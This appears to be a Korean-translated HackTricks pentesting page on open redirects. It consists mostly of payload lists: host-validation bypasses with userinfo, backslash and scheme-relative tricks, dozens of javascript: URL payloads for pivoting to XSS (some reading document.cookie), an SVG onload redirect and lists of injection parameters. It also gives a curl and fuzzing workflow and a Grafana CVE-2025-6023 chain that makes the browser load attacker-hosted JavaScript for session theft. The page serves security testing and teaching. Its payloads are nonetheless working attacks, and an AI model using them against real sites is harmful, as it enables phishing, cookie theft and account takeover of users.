# 오픈 리다이렉트

{{#include ../banners/hacktricks-training.md}}


## 오픈 리다이렉트

### localhost 또는 임의 도메인으로 리다이렉트

- 앱이 “internal/whitelisted hosts”만 허용한다면, 리다이렉트 대상에 대해 다른 호스트 표기법을 시도해 loopback이나 내부 범위를 지정해 보세요:
- IPv4 loopback 변형: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)
- IPv6 loopback 변형: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]
- 후행 점 및 대소문자: localhost., LOCALHOST, 127.0.0.1.
- loopback으로 해석되는 와일드카드 DNS: lvh.me, sslip.io (e.g., 127.0.0.1.sslip.io), traefik.me, localtest.me. 호스트가 “subdomains of X”만 허용하지만 호스트 해석이 여전히 127.0.0.1을 가리킬 때 유용합니다.
- 네트워크-경로 참조는 종종 스킴을 앞에 붙이거나 접두사만 검사하는 단순한 검증기를 우회합니다:
- //attacker.tld → scheme-relative로 해석되어 현재 스킴으로 오프사이트로 이동합니다.
- Userinfo 트릭은 trusted hosts에 대한 contains/startswith 검사들을 우회합니다:
- https://trusted.tld@attacker.tld/ → 브라우저는 attacker.tld로 이동하지만 단순 문자열 검사는 “trusted.tld”를 '본다'고 인식합니다.
- 프레임워크/브라우저 간 백슬래시 파싱 혼동:
- https://trusted.tld\@attacker.tld → 일부 백엔드는 “\”를 경로 문자로 처리하여 검증을 통과시키지만, 브라우저는 이를 “/”로 정규화하고 trusted.tld를 userinfo로 해석하여 사용자를 attacker.tld로 보냅니다. 이는 Node/PHP URL-parser 불일치에서도 나타납니다.

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

### 최신 open-redirect에서 XSS로의 피벗
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Abuse bad subdomain filter
javascript://sub.domain.com/%0Aalert(1)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
<details>
<summary>더 현대적인 URL-based bypass payloads</summary>
```text
# Scheme-relative (current scheme is reused)
//evil.example

# Credentials (userinfo) trick
https://trusted.example@evil.example/

# Backslash confusion (server validates, browser normalizes)
https://trusted.example\@evil.example/

# Schemeless with whitespace/control chars
evil.example%00
%09//evil.example

# Prefix/suffix matching flaws
https://trusted.example.evil.example/
https://evil.example/trusted.example

# When only path is accepted, try breaking absolute URL detection
/\\evil.example
/..//evil.example
```
</details>

## Open Redirect svg 파일 업로드
```html
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
## 일반적인 인젝션 파라미터
```text
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
## 코드 예제

#### .Net
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
#### Java
```bash
response.redirect("http://mysafedomain.com");
```
#### PHP
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
## Hunting and exploitation workflow (실습)

- curl로 단일 URL 확인:
```bash
curl -s -I "https://target.tld/redirect?url=//evil.example" | grep -i "^Location:"
```
- 대규모로 가능한 파라미터를 발견하고 fuzz:

<details>
<summary>확장하려면 클릭</summary>
```bash
# 1) Gather historical URLs, keep those with common redirect params
cat domains.txt \
| gau --o urls.txt            # or: waybackurls / katana / hakrawler

# 2) Grep common parameters and normalize list
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=)" urls.txt \
| sed 's/\r$//' | sort -u > candidates.txt

# 3) Use OpenRedireX to fuzz with payload corpus
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# 4) Manually verify interesting hits
awk '/30[1237]|Location:/I' results.txt
```
</details>

- Don’t forget client-side sinks in SPAs: window.location/assign/replace와 query/hash를 읽어 리디렉션하는 프레임워크 헬퍼를 찾아보세요.

- 프레임워크는 리디렉션 목적지가 신뢰할 수 없는 입력(query params, Referer, cookies)에서 유도될 때 종종 취약점을 유발합니다. Next.js의 리디렉션 관련 주의사항을 확인하고 사용자 입력에서 유도된 동적 목적지는 피하세요.

{{#ref}}
../network-services-pentesting/pentesting-web/nextjs.md
{{#endref}}

- OAuth/OIDC flows: open redirectors를 악용하면 authorization codes/tokens를 leaking하여 account takeover로 자주 이어집니다. 전용 가이드를 참조하세요:

{{#ref}}
./oauth-to-account-takeover.md
{{#endref}}

- Location 없이 리디렉션을 구현하는 서버 응답(meta refresh/JavaScript)은 여전히 phishing에 악용될 수 있으며 때로는 연쇄적으로 이어질 수 있습니다. Grep for:
```html
<meta http-equiv="refresh" content="0;url=//evil.example">
<script>location = new URLSearchParams(location.search).get('next')</script>
```
### Fragment smuggling + client-side traversal chain (Grafana-style bypass)

- **Server-side gap (Go `url.Parse` + raw redirect)**: validators가 `URL.Path`만 검사하고 `URL.Fragment`를 무시하면 외부 호스트를 `#` 뒤에 놓아 속일 수 있습니다. 핸들러가 나중에 *unsanitized* 문자열로 `Location`을 빌드하면, fragments가 리다이렉트 대상에 leak됩니다. `/user/auth-tokens/rotate`에 대한 예:
- Request: `GET /user/auth-tokens/rotate?redirectTo=/%23/..//\//attacker.com HTTP/1.1`
- Parsing sees `Path=/` and `Fragment=/..//\//attacker.com`, so regex + `path.Clean()` approve `/`, but the response emits `Location: /\//attacker.com`, acting as an open redirect.
- **Client-side gap (validate decoded/cleaned, return original)**: SPA helpers가 경로를 완전히 디코딩(중복 인코딩된 `?` 포함)하고 검증을 위해 쿼리를 제거한 뒤 *원본* 문자열을 반환하면 인코딩된 `../`가 살아남습니다. 브라우저가 나중에 디코딩하면 동일 출처의 아무 엔드포인트(예: redirect gadget)로 traversal이 발생합니다. 페이로드 패턴:
- `/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser/auth-tokens/rotate`
- The validator checks `/dashboard/script/` (no `..`), returns the encoded string, and the browser walks to `/user/auth-tokens/rotate`.
- **End-to-end XSS/ATO**: traversal을 fragment-smuggled redirect와 체인으로 연결해 dashboard script loader가 attacker JS를 fetching하도록 강제합니다:
```text
https://<grafana>/dashboard/script/%253f%2f..%2f..%2f..%2f..%2f..%2fuser%2fauth-tokens%2frotate%3fredirectTo%3d%2f%2523%2f..%2f%2f%5c%2fattacker.com%2fmodule.js
```
- path traversal가 rotate endpoint에 도달하면, 프래그먼트에 은닉된 `redirectTo`로부터 `attacker.com/module.js`로 302를 발행합니다. 공격자 origin이 허용적인 CORS로 JS를 제공하면 브라우저가 이를 실행하여 session theft/account takeover가 발생합니다.

## 도구

- [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)
- OpenRedireX – open redirects를 탐지하기 위한 fuzzer. 예:
```bash
# Install
git clone https://github.com/devanshbatham/OpenRedireX && cd OpenRedireX && ./setup.sh

# Fuzz a list of candidate URLs (use FUZZ as placeholder)
cat list_of_urls.txt | ./openredirex.py -p payloads.txt -k FUZZ -c 50
```
## 참고자료

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect 에서 fuzzing lists를 찾을 수 있습니다.
- [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
- [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)
- PortSwigger Web Security Academy – DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- OpenRedireX – A fuzzer for detecting open redirect vulnerabilities: https://github.com/devanshbatham/OpenRedireX
- [Grafana CVE-2025-6023 redirect + traversal bypass chain](https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive)

{{#include ../banners/hacktricks-training.md}}
